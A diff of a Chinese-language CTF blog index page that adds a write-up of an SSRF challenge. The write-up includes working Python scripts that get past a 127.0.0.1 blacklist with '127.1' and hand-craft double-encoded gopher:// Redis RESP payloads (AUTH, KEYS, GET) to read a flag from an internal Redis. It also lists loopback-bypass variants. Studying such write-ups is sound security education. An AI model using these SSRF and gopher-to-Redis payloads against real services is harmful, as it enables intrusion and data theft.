@@ -2265,6 +2265,8 @@
       
         
       
+        
+      
     
     
     
@@ -2630,6 +2632,36 @@
     
   
     RCE
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../redis/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Redis
   
 
     
@@ -3731,6 +3763,198 @@
       <header class="md-typeset">
         <h1 id="web">Web<a class="headerlink" href="#web" title="Permanent link">&para;</a></h1>
       </header>
+      
+        <article class="md-post md-post--excerpt">
+  <header class="md-post__header">
+    
+    <div class="md-post__meta md-meta">
+      <ul class="md-meta__list">
+        <li class="md-meta__item">
+          <time datetime="2026-11-24 22:00:00+00:00">2026-11-24</time></li>
+        
+          <li class="md-meta__item">
+            分类于
+            
+              <a href="../ssrf/" class="md-meta__link">SSRF</a>, 
+              <a href="./" class="md-meta__link">Web</a>, 
+              <a href="../redis/" class="md-meta__link">Redis</a></li>
+        
+        
+          
+          <li class="md-meta__item">
+            
+              需要 3 分钟阅读时间
+            
+          </li>
+        
+        
+      </ul>
+      
+    </div>
+  </header>
+  <div class="md-post__content md-typeset">
+    <h2 id="gopher-redis"><a class="toclink" href="../../mingyuebei-jinghua-shuiyue/">明月杯 · 大观园 — 镜花水月：用 gopher 给 Redis 递纸条</a></h2>
+<blockquote>
+<p><strong>题目类型</strong>：SSRF（gopher 协议）— 打内网 Redis 读 flag</p>
+<p><strong>Flag</strong>：<code>MYCTF{d0fa860f-a161-4617-b900-b1367e419d80}</code></p>
+</blockquote>
+<hr />
+<h3 id="_1"><a class="toclink" href="../../mingyuebei-jinghua-shuiyue/#_1">题目概述</a></h3>
+<p>页面叫「镜花水月」，输入一个网址，服务器替你去“观景”。</p>
+<p>文案里有两句关键的话：</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>园中景致，皆由「览胜使」代为观之   ← 服务器替你请求（SSRF）
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>览胜使只替你看「外头」的景致；园内深处，非请莫入   ← 内网不能直接访问
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>输入框提示：http://example.com/ 或 gopher://...   ← 直接把答案写在占位符里
+</span></code></pre></div>
+<p><strong>输入框的 placeholder 里就有 <code>gopher://</code>——出题人几乎是在提示了。</strong></p>
+<hr />
+<h3 id="_2"><a class="toclink" href="../../mingyuebei-jinghua-shuiyue/#_2">解题过程</a></h3>
+<h4 id="step-1-ssrf"><a class="toclink" href="../../mingyuebei-jinghua-shuiyue/#step-1-ssrf">Step 1：确认是 SSRF，并找到过滤点</a></h4>
+<p><strong>源码里的请求逻辑：</strong></p>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">'/api/preview?url='</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">url</span><span class="p">))</span>
+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="w">  </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">j</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">({</span><span class="nx">s</span><span class="o">:</span><span class="w"> </span><span class="nx">r</span><span class="p">.</span><span class="nx">status</span><span class="p">,</span><span class="w"> </span><span class="nx">j</span><span class="p">})))</span>
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="w">  </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">o</span><span class="p">){</span>
+</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a><span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">o</span><span class="p">.</span><span class="nx">j</span><span class="p">;</span>
+</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">o</span><span class="p">.</span><span class="nx">s</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="mf">200</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">oh</span><span class="p">.</span><span class="nx">textContent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'受阻'</span><span class="p">;</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="nx">render</span><span class="w"> </span><span class="nx">error</span><span class="w"> </span><span class="p">}</span>
+</span></code></pre></div>
+<p><strong>服务端去请求你给的 url，把结果原样返回。</strong></p>
+<p><strong>试 <code>http://127.0.0.1:6379/</code> → 被挡。</strong>说明有黑名单，但拦的只是 <code>127.0.0.1</code> 这个<strong>字符串</strong>。</p>
+<p><strong>换成 <code>127.1</code> 就能过</strong>——前缀里没有 <code>127.0.0.1</code>，但 Linux 会把它解析成本机。</p>
+<h4 id="step-2"><a class="toclink" href="../../mingyuebei-jinghua-shuiyue/#step-2">Step 2：找内网有什么</a></h4>
+<p><strong>dirsearch 扫出一个 <code>robots.txt</code>：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>Disallow: /static/ledger.txt
+</span></code></pre></div>
+<p><strong><code>/static/ledger.txt</code> 是「荣国府 库房账目（残卷）」，末尾藏了一行：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>—— 账尾有小字一行 ——
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>内库钥语，仍用旧例：hengwuyuan
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>（掌钥者切记，勿与外人言）
+</span></code></pre></div>
+<p><strong>“内库”+“钥语”= 内网服务要密码。</strong>结合页面 hint 里的 <code>gopher://</code> 和常见的内网服务，指向 <strong>Redis（6379）</strong>。</p>
+<h4 id="step-3-gopher"><a class="toclink" href="../../mingyuebei-jinghua-shuiyue/#step-3-gopher">Step 3：为什么必须是 gopher</a></h4>
+<p><strong>HTTP 只能发 HTTP 请求，而 Redis 说的是 RESP 协议。</strong></p>
+<p><strong><code>gopher://</code> 能把 <code>_</code> 后面的字节原样发进 TCP 连接——所以能直接手写 RESP 报文。</strong></p>
+<h4 id="step-4"><a class="toclink" href="../../mingyuebei-jinghua-shuiyue/#step-4">Step 4：先认证，再列键</a></h4>
+<p><strong>Redis 的 RESP 是「先声明参数个数，再逐个给长度和内容」：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>*2\r\n            ← 这一条命令有 2 个参数
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>$4\r\nAUTH\r\n    ← 第 1 个参数 4 字节：AUTH
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>$10\r\nhengwuyuan\r\n  ← 第 2 个参数 10 字节：hengwuyuan
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a>*2\r\n$4\r\nKEYS\r\n$1\r\n*\r\n   ← KEYS *
+</span></code></pre></div>
+<p><strong>完整 payload：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="n">PAYLOAD</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">"*2</span><span class="se">\r\n</span><span class="s2">$4</span><span class="se">\r\n</span><span class="s2">AUTH</span><span class="se">\r\n</span><span class="s2">$10</span><span class="se">\r\n</span><span class="s2">hengwuyuan</span><span class="se">\r\n</span><span class="s2">"</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>           <span class="sa">b</span><span class="s2">"*2</span><span class="se">\r\n</span><span class="s2">$4</span><span class="se">\r\n</span><span class="s2">KEYS</span><span class="se">\r\n</span><span class="s2">$1</span><span class="se">\r\n</span><span class="s2">*</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">)</span>
+</span></code></pre></div>
+<p><strong>然后编码成 gopher 链接：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">PAYLOAD</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">safe</span><span class="o">=</span><span class="s2">""</span><span class="p">)</span>
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="n">gopher</span>  <span class="o">=</span> <span class="s2">"gopher://127.1:6379/_"</span> <span class="o">+</span> <span class="n">payload</span>
+</span></code></pre></div>
+<h4 id="step-5"><a class="toclink" href="../../mingyuebei-jinghua-shuiyue/#step-5">Step 5：两层编码，别搞混</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="n">api</span> <span class="o">=</span> <span class="s2">"http://</span><span class="si">%s</span><span class="s2">/api/preview?url=</span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">SITE</span><span class="p">,</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">gopher</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s2">""</span><span class="p">))</span>
+</span></code></pre></div>
+<p><strong>第一层：把 RESP 报文（含 <code>\r\n</code>）编码，放进 gopher 的路径里。</strong>
+<strong>第二层：把整条 gopher URL 再编码，放进 <code>url=</code> 参数里。</strong></p>
+<p><strong>少一层，<code>\r\n</code> 就会被 HTTP 层吃掉，Redis 收到的就是一堆错乱的字节。</strong></p>
+<h4 id="step-6"><a class="toclink" href="../../mingyuebei-jinghua-shuiyue/#step-6">Step 6：看返回</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="kn">import</span><span class="w"> </span><span class="nn">urllib.request</span><span class="o">,</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="o">,</span><span class="w"> </span><span class="nn">json</span>
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="n">PAYLOAD</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">"*2</span><span class="se">\r\n</span><span class="s2">$4</span><span class="se">\r\n</span><span class="s2">AUTH</span><span class="se">\r\n</span><span class="s2">$10</span><span class="se">\r\n</span><span class="s2">hengwuyuan</span><span class="se">\r\n</span><span class="s2">"</span>
+</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>           <span class="sa">b</span><span class="s2">"*2</span><span class="se">\r\n</span><span class="s2">$4</span><span class="se">\r\n</span><span class="s2">KEYS</span><span class="se">\r\n</span><span class="s2">$1</span><span class="se">\r\n</span><span class="s2">*</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">)</span>
+</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">PAYLOAD</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">safe</span><span class="o">=</span><span class="s2">""</span><span class="p">)</span>
+</span><span id="__span-53-6"><a id="__codelineno-53-6" name="__codelineno-53-6" href="#__codelineno-53-6"></a><span class="n">gopher</span> <span class="o">=</span> <span class="s2">"gopher://127.1:6379/_"</span> <span class="o">+</span> <span class="n">payload</span>
+</span><span id="__span-53-7"><a id="__codelineno-53-7" name="__codelineno-53-7" href="#__codelineno-53-7"></a><span class="n">SITE</span> <span class="o">=</span> <span class="s2">"80-759cdb57-54e7-4195-86c5-6044ad5743df.challenge.ctfplus.cn/"</span>
+</span><span id="__span-53-8"><a id="__codelineno-53-8" name="__codelineno-53-8" href="#__codelineno-53-8"></a><span class="n">api</span> <span class="o">=</span> <span class="s2">"http://</span><span class="si">%s</span><span class="s2">api/preview?url=</span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">SITE</span><span class="p">,</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">gopher</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s2">""</span><span class="p">))</span>
+</span><span id="__span-53-9"><a id="__codelineno-53-9" name="__codelineno-53-9" href="#__codelineno-53-9"></a><span class="n">raw</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">api</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">40</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span><span id="__span-53-10"><a id="__codelineno-53-10" name="__codelineno-53-10" href="#__codelineno-53-10"></a><span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">raw</span><span class="p">))</span>
+</span></code></pre></div>
+<p><strong>返回的 body：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>+OK\r\n*1\r\n$4\r\nflag\r\n
+</span></code></pre></div>
+<p><strong>拆开看：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>+OK                AUTH 成功
+</span><span id="__span-55-2"><a id="__codelineno-55-2" name="__codelineno-55-2" href="#__codelineno-55-2"></a>*1                 只有一个键
+</span><span id="__span-55-3"><a id="__codelineno-55-3" name="__codelineno-55-3" href="#__codelineno-55-3"></a>$4 flag            键名是 flag
+</span></code></pre></div>
+<h4 id="step-7"><a class="toclink" href="../../mingyuebei-jinghua-shuiyue/#step-7">Step 7：读那个键</a></h4>
+<p><strong>把 <code>KEYS *</code> 换成 <code>GET flag</code>：</strong></p>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="n">PAYLOAD</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">"*2</span><span class="se">\r\n</span><span class="s2">$4</span><span class="se">\r\n</span><span class="s2">AUTH</span><span class="se">\r\n</span><span class="s2">$10</span><span class="se">\r\n</span><span class="s2">hengwuyuan</span><span class="se">\r\n</span><span class="s2">"</span>
+</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a>           <span class="sa">b</span><span class="s2">"*2</span><span class="se">\r\n</span><span class="s2">$3</span><span class="se">\r\n</span><span class="s2">GET</span><span class="se">\r\n</span><span class="s2">$4</span><span class="se">\r\n</span><span class="s2">flag</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">)</span>
+</span></code></pre></div>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>MYCTF{d0fa860f-a161-4617-b900-b1367e419d80}
+</span></code></pre></div>
+<hr />
+<table>
+<thead>
+<tr>
+<th>关键点</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>入口</td>
+<td><code>/api/preview?url=</code> 服务端替换请求</td>
+</tr>
+<tr>
+<td>黑名单</td>
+<td>拦字符串 <code>127.0.0.1</code>，用 <code>127.1</code> 绕过（Linux 能解析）</td>
+</tr>
+<tr>
+<td>情报</td>
+<td><code>robots.txt</code> → <code>/static/ledger.txt</code> → Redis 密码 <code>hengwuyuan</code></td>
+</tr>
+<tr>
+<td>协议选择</td>
+<td>HTTP 发不了 RESP，必须 <code>gopher://</code></td>
+</tr>
+<tr>
+<td>RESP 结构</td>
+<td><code>*参数个数</code> + 每个参数的 <code>$长度</code> + 内容，全部 CRLF 分隔</td>
+</tr>
+<tr>
+<td>编码层数</td>
+<td>报文编码一次（进 gopher 路径）→ 整条 URL 再编码一次（进 url 参数）</td>
+</tr>
+<tr>
+<td>成功标志</td>
+<td><code>+OK</code> 表示 AUTH 成功；<code>*N</code> 后面的 <code>$长度 内容</code> 是返回值</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<details class="note">
+<summary>两个脚本</summary>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a><span class="c1"># ① 列键</span>
+</span><span id="__span-58-2"><a id="__codelineno-58-2" name="__codelineno-58-2" href="#__codelineno-58-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">urllib.request</span><span class="o">,</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="o">,</span><span class="w"> </span><span class="nn">json</span>
+</span><span id="__span-58-3"><a id="__codelineno-58-3" name="__codelineno-58-3" href="#__codelineno-58-3"></a><span class="n">PAYLOAD</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">"*2</span><span class="se">\r\n</span><span class="s2">$4</span><span class="se">\r\n</span><span class="s2">AUTH</span><span class="se">\r\n</span><span class="s2">$10</span><span class="se">\r\n</span><span class="s2">hengwuyuan</span><span class="se">\r\n</span><span class="s2">"</span>
+</span><span id="__span-58-4"><a id="__codelineno-58-4" name="__codelineno-58-4" href="#__codelineno-58-4"></a>           <span class="sa">b</span><span class="s2">"*2</span><span class="se">\r\n</span><span class="s2">$4</span><span class="se">\r\n</span><span class="s2">KEYS</span><span class="se">\r\n</span><span class="s2">$1</span><span class="se">\r\n</span><span class="s2">*</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">)</span>
+</span><span id="__span-58-5"><a id="__codelineno-58-5" name="__codelineno-58-5" href="#__codelineno-58-5"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">PAYLOAD</span><span class="o">.</span><span class="n">decode</span><span class="p">(),</span> <span class="n">safe</span><span class="o">=</span><span class="s2">""</span><span class="p">)</span>
+</span><span id="__span-58-6"><a id="__codelineno-58-6" name="__codelineno-58-6" href="#__codelineno-58-6"></a><span class="n">gopher</span> <span class="o">=</span> <span class="s2">"gopher://127.1:6379/_"</span> <span class="o">+</span> <span class="n">payload</span>
+</span><span id="__span-58-7"><a id="__codelineno-58-7" name="__codelineno-58-7" href="#__codelineno-58-7"></a><span class="n">SITE</span> <span class="o">=</span> <span class="s2">"80-759cdb57-54e7-4195-86c5-6044ad5743df.challenge.ctfplus.cn/"</span>
+</span><span id="__span-58-8"><a id="__codelineno-58-8" name="__codelineno-58-8" href="#__codelineno-58-8"></a><span class="n">api</span> <span class="o">=</span> <span class="s2">"http://</span><span class="si">%s</span><span class="s2">api/preview?url=</span><span class="si">%s</span><span class="s2">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">SITE</span><span class="p">,</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">gopher</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s2">""</span><span class="p">))</span>
+</span><span id="__span-58-9"><a id="__codelineno-58-9" name="__codelineno-58-9" href="#__codelineno-58-9"></a><span class="nb">print</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">urllib</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">api</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">40</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span>
+</span></code></pre></div>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a><span class="c1"># ② 读值：只改中间那一段</span>
+</span><span id="__span-59-2"><a id="__codelineno-59-2" name="__codelineno-59-2" href="#__codelineno-59-2"></a><span class="n">PAYLOAD</span> <span class="o">=</span> <span class="p">(</span><span class="sa">b</span><span class="s2">"*2</span><span class="se">\r\n</span><span class="s2">$4</span><span class="se">\r\n</span><span class="s2">AUTH</span><span class="se">\r\n</span><span class="s2">$10</span><span class="se">\r\n</span><span class="s2">hengwuyuan</span><span class="se">\r\n</span><span class="s2">"</span>
+</span><span id="__span-59-3"><a id="__codelineno-59-3" name="__codelineno-59-3" href="#__codelineno-59-3"></a>           <span class="sa">b</span><span class="s2">"*2</span><span class="se">\r\n</span><span class="s2">$3</span><span class="se">\r\n</span><span class="s2">GET</span><span class="se">\r\n</span><span class="s2">$4</span><span class="se">\r\n</span><span class="s2">flag</span><span class="se">\r\n</span><span class="s2">"</span><span class="p">)</span>
+</span></code></pre></div>
+</details>
+<details class="note">
+<summary>这题踩的坑</summary>
+<p><strong>① 想到命令执行去了</strong></p>
+<p><strong>页面像搜索框，第一反应是管道/命令注入。</strong>但它是“服务器替你请求 URL”，<strong>是 SSRF，不是 RCE。</strong></p>
+<p><strong>② 死磕 <code>127.0.0.1</code></strong></p>
+<p><strong>黑名单只拦这个字符串。</strong><code>127.1</code>、<code>0.0.0.0</code>、<code>[::1]</code>、<code>127.0.0.01</code>（部分系统）都是候选。</p>
+<p><strong>③ 忘了 AUTH</strong></p>
+<p><strong>这个 Redis 要密码。</strong>没有 <code>AUTH</code> 直接 <code>KEYS *</code>，返回的是 <code>-NOAUTH</code>。</p>
+<p><strong>④ <code>$长度</code> 写错</strong></p>
+<p><strong>RESP 的长度是</strong>字节数<strong>：<code>AUTH</code>=4、<code>hengwuyuan</code>=10、<code>KEYS</code>=4、<code>*</code>=1、<code>GET</code>=3、<code>flag</code>=4。</strong>写错一位，Redis 就认为协议错误，直接断开。</p>
+<p><strong>⑤ 只编码一层</strong></p>
+<p><strong><code>\r\n</code> 必须活着到达 Redis。</strong>两层 <code>quote(..., safe="")</code> 是对的做法。</p>
+</details>
+    
+    
+  </div>
+</article>
       
         <article class="md-post md-post--excerpt">
   <header class="md-post__header">
@@ -5068,9 +5292,9 @@
 <hr />
 <h3 id="_1"><a class="toclink" href="../../myctf-xxe-shi-jian/#_1">题目概述</a></h3>
 <p>题目背景写得很讲究：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>诗笺不再手书，改以 XML 书就，交誊录官代为誊抄入册。
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>誊录官是个实诚人：笺上写什么，他便抄什么，一字不改。
-</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>听新闻社中那面小旗，就压在誊录官的案头（/flag）。
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>诗笺不再手书，改以 XML 书就，交誊录官代为誊抄入册。
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>誊录官是个实诚人：笺上写什么，他便抄什么，一字不改。
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>听新闻社中那面小旗，就压在誊录官的案头（/flag）。
 </span></code></pre></div>
 <p><strong>“笺上写什么就抄什么，一字不改”——这就是在告诉你：服务器会</strong>原样解析并回显<strong>你提交的 XML。</strong></p>
 <p><strong>而那面小旗（flag）就在它案头，也就是 <code>/flag</code> 文件。</strong></p>
@@ -5079,64 +5303,64 @@
 <h3 id="_2"><a class="toclink" href="../../myctf-xxe-shi-jian/#_2">解题过程</a></h3>
 <h4 id="step-1-js"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-1-js">Step 1：先看 JS，找到提交入口</a></h4>
 <p><strong>页面里有个输入框，但按钮背后才是关键。翻页面源码里的脚本：</strong></p>
-<div class="language-javascript highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="k">try</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">'/tengchao'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span>
-</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/xml'</span><span class="p">},</span>
-</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'x'</span><span class="p">).</span><span class="nx">value</span>
-</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="w">  </span><span class="p">})</span>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">'/tengchao'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/xml'</span><span class="p">},</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'x'</span><span class="p">).</span><span class="nx">value</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a><span class="w">  </span><span class="p">})</span>
 </span></code></pre></div>
 <p><strong>三件事一眼看清：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>接口      POST /tengchao
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>类型      application/xml
-</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>请求体    输入框 #x 里的全部内容，原样提交
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>接口      POST /tengchao
